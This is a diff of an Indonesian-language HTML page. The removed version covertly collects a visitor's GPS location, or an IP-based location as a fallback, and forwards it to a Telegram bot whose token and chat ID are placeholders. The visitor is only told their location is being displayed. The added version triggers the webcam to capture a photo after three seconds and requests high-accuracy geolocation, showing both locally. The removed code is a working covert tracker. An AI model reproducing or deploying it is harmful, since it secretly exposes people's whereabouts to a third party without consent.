@@ -3,93 +3,81 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Dapatkan Lokasi Anda</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            text-align: center;
-            margin-top: 50px;
-        }
-    </style>
+    <title>Ambil Foto dan Lokasi</title>
 </head>
 <body>
-    <h1>Dapatkan Lokasi Anda</h1>
-    <p id="location">Sedang memuat lokasi...</p>
-    <button id="goToDodol" style="display:none;">Lihat Lokasi di Dodol.html</button>
+    <h1>Ambil Foto dan Lokasi</h1>
+    <a href="#" onclick="capturePhotoAndLocation()">Klik di sini untuk mengambil foto dan lokasi</a>
+    
+    <br><br>
+    <video id="video" width="320" height="240" autoplay></video>
+    <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
+    <br>
+    <img id="photo" src="" alt="Foto akan muncul di sini" width="320" height="240">
+    <p id="location">Lokasi akan muncul di sini</p>
 
     <script>
-        // Memeriksa apakah browser mendukung Geolocation
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(position => {
-                const { latitude, longitude } = position.coords;
-                document.getElementById('location').innerHTML = `Latitude: ${latitude}, Longitude: ${longitude}`;
-                
-                // Simpan lokasi ke local storage
-                localStorage.setItem('location', JSON.stringify({ latitude, longitude }));
+        function capturePhotoAndLocation() {
+            // Ambil Foto Menggunakan Kamera
+            var video = document.getElementById('video');
+            var canvas = document.getElementById('canvas');
+            var photo = document.getElementById('photo');
 
-                // Kirim lokasi ke Telegram
-                sendLocationToTelegram(latitude, longitude);
-                
-                // Tampilkan tombol untuk pergi ke dodol.html
-                document.getElementById('goToDodol').style.display = 'block';
-            }, error => {
-                console.error('Error getting location:', error);
-                getLocationByIP(); // Jika gagal, ambil lokasi berdasarkan IP
+            // Meminta izin untuk menggunakan kamera
+            navigator.mediaDevices.getUserMedia({ video: true })
+            .then(function(stream) {
+                video.srcObject = stream;
+                setTimeout(function() {
+                    // Mengambil foto setelah 3 detik
+                    var context = canvas.getContext('2d');
+                    context.drawImage(video, 0, 0, 320, 240);
+                    var dataURL = canvas.toDataURL('image/png');
+                    photo.src = dataURL;
+                    video.srcObject.getTracks().forEach(track => track.stop()); // Matikan kamera setelah foto diambil
+                }, 3000);
+            })
+            .catch(function(err) {
+                console.log("Terjadi kesalahan dalam akses kamera: " + err);
             });
-        } else {
-            document.getElementById('location').innerHTML = "Geolocation tidak didukung oleh browser ini.";
-            getLocationByIP(); // Jika tidak didukung, ambil lokasi berdasarkan IP
-        }
 
-        // Fungsi untuk mengambil lokasi berdasarkan IP
-        function getLocationByIP() {
-            fetch('https://ipapi.co/json/')
-                .then(response => response.json())
-                .then(data => {
-                    const { city, region, country } = data;
-                    document.getElementById('location').innerHTML = `Kota: ${city}, Wilayah: ${region}, Negara: ${country}`;
-                    
-                    // Simpan lokasi berdasarkan IP ke local storage
-                    localStorage.setItem('location', JSON.stringify({ city, region, country }));
-
-                    // Kirim lokasi ke Telegram
-                    sendLocationToTelegram(city, region, country);
-                    
-                    // Tampilkan tombol untuk pergi ke dodol.html
-                    document.getElementById('goToDodol').style.display = 'block';
-                })
-                .catch(error => {
-                    document.getElementById('location').innerHTML = "Terjadi kesalahan saat mengambil lokasi.";
-                    console.error('Error:', error);
+            // Ambil Lokasi Menggunakan Geolocation API
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(showPosition, showError, {
+                    enableHighAccuracy: true, 
+                    timeout: 20000, 
+                    maximumAge: 0
                 });
+            } else { 
+                document.getElementById("location").innerHTML = "Geolocation tidak didukung oleh browser ini.";
+            }
         }
 
-        // Fungsi untuk mengirim lokasi ke Telegram
-        function sendLocationToTelegram(latitude, longitude) {
-            const chatId = 'YOUR_CHAT_ID'; // Ganti dengan chat ID Anda
-            const token = 'YOUR_BOT_TOKEN'; // Ganti dengan token bot Anda
-            const message = `Lokasi baru telah diakses: Latitude: ${latitude}, Longitude: ${longitude}`;
-            
-            // Menggunakan Fetch API untuk mengirim pesan
-            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
-                .then(response => {
-                    if (response.ok) {
-                        console.log("Pesan terkirim ke Telegram.");
-                    } else {
-                        return response.json().then(err => {
-                            console.error("Gagal mengirim pesan ke Telegram:", err);
-                        });
-                    }
-                })
-                .catch(error => {
-                    console.error('Error:', error);
-                });
+        // Fungsi untuk menampilkan posisi
+        function showPosition(position) {
+            var lat = position.coords.latitude;
+            var lon = position.coords.longitude;
+            var accuracy = position.coords.accuracy;
+            document.getElementById("location").innerHTML = 
+                "Latitude: " + lat + "<br>Longitude: " + lon + "<br>Akurasi: " + accuracy + " meter";
         }
 
-        // Event listener untuk tombol pergi ke dodol.html
-        document.getElementById('goToDodol').addEventListener('click', () => {
-            window.location.href = 'dodol.html';
-        });
+        // Fungsi untuk menampilkan kesalahan geolocation
+        function showError(error) {
+            switch(error.code) {
+                case error.PERMISSION_DENIED:
+                    alert("Pengguna menolak permintaan Geolocation.");
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    alert("Informasi lokasi tidak tersedia.");
+                    break;
+                case error.TIMEOUT:
+                    alert("Permintaan untuk mendapatkan lokasi terlalu lama.");
+                    break;
+                case error.UNKNOWN_ERROR:
+                    alert("Terjadi kesalahan yang tidak diketahui.");
+                    break;
+            }
+        }
     </script>
 </body>
 </html>
